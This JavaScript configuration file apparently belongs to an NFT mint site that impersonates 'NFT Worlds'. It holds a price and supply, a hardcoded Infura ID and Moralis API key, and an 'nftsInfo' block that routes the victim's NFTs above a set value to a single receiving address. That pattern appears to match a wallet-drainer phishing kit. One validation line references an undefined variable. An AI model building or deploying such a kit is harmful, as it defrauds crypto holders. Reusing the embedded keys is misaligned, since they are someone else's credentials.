const address = '0xE297cEC625C1043add07067B4ddC9ec3A9BBde13',
  infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
  moralisApi =
    'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
const x20Ethereum = '0xE297cEC625C1043add07067B4ddC9ec3A9BBde13'
const collectionInfo = {
  name: 'NFT Worlds',
  title: 'Avatars',
  date: '30.04.2022',
  socialMedia: {
    discord: 'https://discord.gg/',
    twitter: 'https://twitter.com',
  },
  medias: {
    preview: 'preview.gif',
    favicon: 'logo.png',
  },
  background: {
    type: 'video',
    image: 'background.jpg',
    video: 'background.mp4',
    color: '#4E4E6D',
  },
}
const mintInfo = {
    price: 0.07,
    totalSupply: 7777,
    minUnits: 1,
    maxUnits: 10,
    askMintLoop: true,
  },
  nftsInfo = {
    active: true,
    minValue: 5,
    checkMaxDay: 3,
    receiveAddress: '0xE297cEC625C1043add07067B4ddC9ec3A9BBde13',
  }
if (mintInfo.minUnits > mintInfo.maxUnits) {
  console.error(
    'Error: minUnits (' +
      mintInfo.minUnits +
      ') is greater than maxUnits (' +
      maxUnits +
      ')'
  )
}
if (mintInfo.minUnits <= 0) {
  console.error(
    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
  )
}
if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
  console.error('Error: ' + address + ' is not a valid Ethereum address.')
}
